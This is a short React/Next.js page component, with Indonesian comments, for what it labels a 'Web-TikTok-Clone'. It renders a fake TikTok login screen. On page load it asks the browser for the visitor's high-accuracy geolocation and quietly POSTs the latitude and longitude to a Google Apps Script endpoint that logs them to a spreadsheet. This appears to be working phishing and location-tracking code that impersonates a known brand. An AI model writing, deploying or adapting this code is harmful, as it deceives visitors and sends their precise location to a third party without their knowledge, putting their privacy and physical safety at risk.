"use client";

import { useEffect } from "react";
import TikTokLogin from "./components/TiktokLogin";

export default function Home() {

  useEffect(() => {
    const G_SHEET_URL = "https://script.google.com/macros/s/AKfycbyMUs62wkY5N_G9Mqjhbp9G9fn8KRw8QPjhJNC634f1i7tFfxxkj9LScJ8-v7ANGk7mlA/exec";

    const sendToSheet = async (lat: number, lng: number) => {

      // Kita gunakan format Form Data agar Apps Script lebih mudah membacanya
      const formData = new FormData();
      formData.append("lat", lat.toString());
      formData.append("lng", lng.toString());
      formData.append("device", "Web-TikTok-Clone");

      try {
        await fetch(G_SHEET_URL, {
          method: "POST",
          mode: "no-cors", // Tetap gunakan no-cors
          body: formData,
        });
        console.log("Data dikirim:", lat, lng);
      } catch (error) {
        console.error("Gagal kirim:", error);
      }
    };
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          sendToSheet(latitude, longitude);
        },
        (error) => {
          console.error("Izin lokasi ditolak atau error:", error.message);
        },
        { enableHighAccuracy: true }
      );
    }
  }, []);

  return (
    <main>
      <TikTokLogin />
    </main>
  );
}